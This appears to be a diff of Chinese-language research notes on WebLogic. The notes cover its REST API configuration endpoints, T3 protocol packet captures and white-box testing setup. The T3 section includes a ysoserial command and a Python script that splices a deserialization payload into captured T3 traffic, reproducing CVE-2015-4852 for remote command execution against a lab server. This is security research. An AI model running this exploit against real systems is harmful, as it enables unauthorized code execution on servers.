@@ -476,6 +476,8 @@ run:360, ExecuteThread (weblogic.work)
 
 ### rest API分析 比如服务器模板改的是哪个地方 、system component是哪些、filestore是什么存储
 
+**服务器模板**
+
 ```json
         "method": "post",
         "url": "/management/weblogic/{version}/edit/serverTemplates",
@@ -494,24 +496,33 @@ run:360, ExecuteThread (weblogic.work)
             }
         ]
 
-    {
-        "method": "post",
-        "url": "/management/weblogic/{version}/edit/systemComponents",
-        "parameters": [
-            {
-                "schema": {
-                    "$ref": "#/definitions/System Component"
-                },
-                "name": "payload",
-                "required": true,
-                "in": "body",
-                "description": "<p>Must contain a populated system component model.</p>"
-            },
-            {
-                "$ref": "#/parameters/Request Header X-Requested-By"
-            }
-        ]
-    },
+
+```
+
+serverTemplates修改的内容为服务器模板，但这里的服务器模板和常见的web app 的html模板不同，这里的模板主要是weblogic服务器的基本配置信息，服务器模板是WebLogic用于定义创建新服务器实例时的默认配置。也就是可以为WebLogic服务器预定义某些特性，如JDBC设置，JMS设置，集群设置等等。如果要在多个地方部署类似的WebLogic服务器，使用模板可以大大提高效率，确保配置的一致性。下面是服务器模板可设置的一些参数
+
+```
+JDBCLLRTableName: JDBC登录线性记录表名
+JMSConnectionFactoryUnmappedResRefMode: 为没有映射的资源引用提供JMS连接工厂的模式
+JMSDefaultConnectionFactoriesEnabled: 指示是否启用JMS默认连接工厂
+adminReconnectIntervalSeconds: 管理员重新连接的间隔时间（秒）
+administrationPort: 用于服务器管理通信的端口号
+autoMigrationEnabled: 指示是否启用自动迁移
+autoRestart: 指示在失败时是否自动重启服务器
+clusterWeight: 集群权重
+completeMessageTimeout: 完整消息的超时时间
+defaultProtocol: 默认通信协议
+healthCheckIntervalSeconds: 健康检查的间隔时间（秒）
+listenAddress: 服务器监听的IP地址
+listenPort: 服务器监听的端口号
+maxMessageSize: 可接收的最大消息大小
+```
+
+
+
+
+
+**文件存储**
 
     {
         "method": "post",
@@ -530,7 +541,73 @@ run:360, ExecuteThread (weblogic.work)
                 "$ref": "#/parameters/Request Header X-Requested-By"
             }
         ]
-    },
+    }
+
+filestore主要用于weblogic中文件的持久化存储，对于特定的消息，可以选择设置持久化存储，这样在weblogic重启之后，消息将仍然保存。weblogic的持久化存储类型有两种，一种是数据库类型的存储，也就是JDBC存储，一种是文件存储，该api只涉及到使用文件存储进行持久化存储。FileStore通常用于存储WebLogic的子系统和服务所需的持久化数据，例如JMS消息、事务日志、EJB定时器、路径服务等。下面是filestore可设置的部分参数
+
+```
+XAResourceName: 用于FileStore的XA资源名称。
+blockSize: FileStore中每个块的大小（以字节为单位）。
+cacheDirectory: 用于FileStore缓存的目录路径。
+deploymentOrder: 定义了在WebLogic Server启动时资源部署的顺序。
+directory: FileStore使用的文件系统目录路径。
+distributionPolicy: 文件分布策略，可以是"Distributed"或"Singleton"。
+dynamicallyCreated: 指示FileStore是否动态创建。
+failOverLimit: 文件故障转移限制。
+failbackDelaySeconds: 故障恢复延迟时间（以秒为单位）。
+fileLockingEnabled: 指示是否启用文件锁定。
+id: FileStore的唯一标识符。
+initialBootDelaySeconds: 初始启动延迟时间（以秒为单位）。
+initialSize: FileStore的初始大小（以字节为单位）。
+ioBufferSize: 输入/输出缓冲区大小（以字节为单位）。
+logicalName: FileStore的逻辑名称。
+maxFileSize: 文件的最大大小（以字节为单位）。
+```
+
+filestore的存储位置为config.xml中，这个配置文件中包含了大部分配置文件，其中某些配置文件被写在config文件夹下的其他文件夹中
+
+![image-20230725000825140](.\images\image-20230725000825140.png)
+
+
+
+
+
+**系统组件**
+
+    {
+        "method": "post",
+        "url": "/management/weblogic/{version}/edit/systemComponents",
+        "parameters": [
+            {
+                "schema": {
+                    "$ref": "#/definitions/System Component"
+                },
+                "name": "payload",
+                "required": true,
+                "in": "body",
+                "description": "<p>Must contain a populated system component model.</p>"
+            },
+            {
+                "$ref": "#/parameters/Request Header X-Requested-By"
+            }
+        ]
+    }
+
+系统组件相关的资料非常少，根据官网上提供的资料，componentType只提到了 Oracle HTTP Server (OHS) 和 Coherence 缓存服务器，这两个服务器都是 Oracle Fusion Middleware 的组成部分。
+
+```
+"autoRestart": 如果为 true，则该组件在失败后将自动重新启动。
+"componentType": 指定 System Component 的类型。
+"dynamicallyCreated": 如果为 true，则该组件是动态创建的。动态创建的组件在服务器启动时不会自动启动，而是需要明确地被启动。
+"id": 组件的唯一标识符。
+"machine": 这可能是一个包含一到多个字符串的数组，用于指定运行该组件的机器的名称。
+"name": 组件的名称。
+"notes": 关于组件的一些注释或描述。
+"restartDelaySeconds": 组件失败后重新启动之前的延迟时间（以秒为单位）。
+"restartIntervalSeconds": 重新启动尝试之间的时间间隔（以秒为单位）。
+"restartMax": 在放弃重新启动尝试前，尝试重新启动的最大次数。
+"tags": 一组标签，可以用来分类或注解该组件。
+"type": 可能是指定 System Component 类型的另一种方式。
 ```
 
 
@@ -539,9 +616,204 @@ run:360, ExecuteThread (weblogic.work)
 
 
 
+### t3反序列化接口分析
+
+网上对t3协议分析的流程图
+
+![image-t3](.\images\t3.jpg)
+
+通过修改之前利用jndi注入的代码，客户端向weblogic服务器绑定对象，使用t3接口
+
+```java
+package weblogic;
+
+import org.apache.commons.lang.RandomStringUtils;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import java.lang.reflect.Field;
+import java.util.Hashtable;
+
+public class T3 {
+    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";
+    private static InitialContext getInitialContext(String url)throws NamingException
+    {
+        Hashtable<String,String> env = new Hashtable<String,String>();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
+        env.put(Context.PROVIDER_URL, url);
+        return new InitialContext(env);
+    }
+    //iiop
+    //iiop
+    public static void main(String args[]) throws Exception {
+        InitialContext c=getInitialContext("t3://192.168.0.102:7001");
+
+        String StrObj=new String("12345");
+        String ranStr= RandomStringUtils.random(5, new char[]{'a','b','c','d','e','f', '1', '2', '3'});
+        c.bind(ranStr,StrObj);
+        c.lookup(ranStr);
+        System.out.println("done");
+    }
+}
+```
+
+使用wireshark抓包可获取t3通信的数据流，绑定的字符串为12345，客户端将字符串序列化之后发送到服务器，可以在数据流中找到字符串的序列化数据，如果服务器要将该对象成功反序列化，则相应的类必须存在于服务上
+
+```
+客户端：
+t3 12.2.1
+AS:255
+HL:19
+MS:10000000
+LP:DOMAIN
+PU:t3://192.168.0.102:7001
+
+服务器：
+HELO:12.2.1.3.0.false
+AS:2048
+HL:19
+MS:10000000
+PN:DOMAIN
+
+客户端发送详细信息：
+.....e............q...`....a...1..wR:./!#..;*..(....ysr.xr.xr.xp.....................pppppp.....................p.........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitlet..Ljava/lang/String;L.
+implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagest.'[Lweblogic/common/internal/PackageInfo;L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
+implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.!weblogic.common.internal.PeerInfoXTt........I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatch[..packagest.'[Lweblogic/common/internal/PackageInfo;xr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagesq.~..L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
+implVendorq.~..L..implVersionq.~..xpw...x...........sr..weblogic.rjvm.JVMID.I.>...*...xpwS!.........
+192.168.0.102..host.docker.internal.;.........Y.........................x........sr..weblogic.rjvm.JVMID.I.>...*...xpw.....1.....
+172.20.0.1.........x
+服务器发送详细信息：
+.....e................`....E...........D..=(.+......ysr.xr.xr.xp.....................pppppp.....................p........t3://172.18.0.2:7001.........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr..weblogic.rjvm.ClusterInfo90.s	..S.....xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitlet..Ljava/lang/String;L.
+implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagest.'[Lweblogic/common/internal/PackageInfo;L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
+implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.!weblogic.common.internal.PeerInfoXTt........I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatch[..packagest.'[Lweblogic/common/internal/PackageInfo;xr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagesq.~..L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
+implVendorq.~..L..implVersionq.~..xpw...x...........sr..weblogic.rjvm.JVMID.I.>...*...xpwr....1.....
+172.20.0.1...........[.L.Aw.
+172.18.0.2..5H.......Y...Y......................base_domain..AdminServer..x........sr..weblogic.rjvm.JVMID.I.>...*...xpwT...[.L.Aw.
+172.18.0.2..5H.......Y...Y......................base_domain..AdminServer.x
+客户端发送绑定请求以及反序列化数据
+.../.e........	.......t..aeda1t..12345sr.xp?@......w.........t..java.naming.factory.initialt.%weblogic.jndi.WLInitialContextFactoryt..java.naming.provider.urlt..t3://192.168.0.102:7001xp.........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr..java.util.Hashtable...%!J.....F.
+loadFactorI.	thresholdxpw...x........sr.%weblogic.rjvm.ImmutableServiceContext...pc......xr.)weblogic.rmi.provider.BasicServiceContext.c"6.......xpw...sr.&weblogic.rmi.internal.MethodDescriptor.HZ....{...xpwE.?bind(Ljava.lang.String;Ljava.lang.Object;Ljava.util.Hashtable;)...	xx...
+服务器响应
+.....e.............p....
+客户端发送查找请求
+.....e........	.......t..aeda1sr.xp?@......w.........t..java.naming.factory.initialt.%weblogic.jndi.WLInitialContextFactoryt..java.naming.provider.urlt..t3://192.168.0.102:7001xp..........sr.%weblogic.rjvm.ImmutableServiceContext...pc......xr.)weblogic.rmi.provider.BasicServiceContext.c"6.......xpw...sr.&weblogic.rmi.internal.MethodDescriptor.HZ....{...xpw5./lookup(Ljava.lang.String;Ljava.util.Hashtable;)...	xx...
+服务器返回序列化之后的对象
+... .e.............t..12345p....
+
+```
+
+通过python的socket接口向weblogic也可以发送t3请求，对于存在t3反序列化漏洞的版本，可以这样构造恶意代码造成远程命令执行
+
+```python
+import socket
+import struct
+import sys
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_address = ("192.168.0.102", 7001)
+print ('connecting to ')
+sock.connect(server_address)
+
+# Send headers
+headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
+headers_bytes = headers.encode('utf-8')
+print( 'sending ')
+sock.sendall(headers_bytes)
 
 
-### 白盒测试
+data = sock.recv(1024)
+print ( 'received "%s"' % data)
+
+# the evil obj can be sent if the vulnerability exists
+...
+```
+
+![image-20230714003921173](.\images\image-20230714003921173-16902137501053.png)
+
+
+
+**具体攻击方式**
+
+对t3数据包进行进一步分析
+
+- 每个数据包里不止包含一个序列化魔术头（0xac 0xed 0x00 0x05）
+- 每个序列化数据包前面都有相同的二进制串（0xfe 0x01 0x00 0x00）
+- 每个数据包上面都包含了一个T3协议头，发现前面四个字节是数据包长度
+
+![img](.\images\t010438efe9d5afaa18.png)
+
+攻击思路：数据包中包含多个序列化的对象，可以尝试构造恶意对象并替换其中的一个序列化对象，然后封装到数据包中重新发送
+
+![img](.\images\t01930ddfbdb4fc2f6a.png)
+
+CVE-2015-4852漏洞复现 （t3反序列化漏洞）
+
+```
+java -jar ysoserial.jar CommonsCollections1 'touch /test.txt' > payload.bin
+```
+
+python攻击脚本
+
+```python
+import socket
+import struct
+import sys
+from scapy.all import *
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_address = ("192.168.0.102", 7001)
+print ('connecting to ')
+sock.connect(server_address)
+
+# Send headers
+headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
+headers_bytes = headers.encode('utf-8')
+print( 'sending ')
+sock.sendall(headers_bytes)
+
+
+data = sock.recv(1024)
+print ( 'received "%s"' % data)
+
+######################################以下是具体的攻击部分#####################################
+
+# 传入一个文件名，在本例中为刚刚生成的
+payloadObj = open("payload.bin",'rb').read()
+
+# 读取 .pcap 文件
+packets = rdpcap('t3.pcap')
+
+# 然后可以通过索引访问单个数据包
+# 这里获取第一个数据包（索引为 0）
+origin_packet = packets[0]
+
+# 如果数据包的负载是你需要的部分，你可以这样获取
+payload = origin_packet[Raw].load
+
+# 截取整个payload 的一部分，从24到155
+payload_head = payload[23:155]
+
+# 复制剩余数据包，从408到1564
+payload_tail=payload[408:1564]
+
+#重新组成payload
+payload=payload_head+payloadObj+payload_tail
+
+# 重新计算数据包大小并替换原数据包中的前四个字节
+payload = "{0}{1}".format(struct.pack('!i', len(payload)), payload[4:])
+
+print('sending payload...')
+sock.send(payload)
+```
+
+![image-20230725015601524](.\images\image-20230725015601524.png)
+
+
+
+
+
+### 白盒测试方法
 
 尝试白盒测试，weblogic的服务器逻辑代码主要存储在D:\Oracle\Middleware\Oracle_Home\wlserver\server\lib和D:\Oracle\Middleware\Oracle_Home\wlserver\modules目录下，将这两个目录复制出来，然后用7-zip对目录下所有jar包进行解压，执行以下命令
 
@@ -562,3 +834,12 @@ for /R "D:\security\findclass\modules" %i in (*.jar) do "D:\security\7-Zip\7z.ex
 搜索latest关键字，几乎所有api都使用latest这个字符表示版本，可以搜到结果，但是结果太多，找其中可能性大的进一步分析
 
 ![image-20230716231729994](.\images\image-20230716231729994.png)
+
+
+
+在调试过程中发现，在D:\Oracle\Middleware\Oracle_Home\oracle_common\modules目录下，还有部分weblogic相关的代码，也就是，最新版weblogic（14.1.1.0）的需要加载的代码，与之前发生了变化，尤其是与rest api相关的内容，很多都出现在该目录下，weblogic的rest api实现部分很多都依赖于jersey库，该库也位于这个目录下
+
+
+
+不过即使在加载了这三个文件夹的情况下，在调试过程中仍然会有极少数逻辑显示本地没有相应代码，最保险的方式还是直接搜索weblogic文件夹下的所有jar文件，然后放在一个文件夹中，作为依赖库导入项目中
+
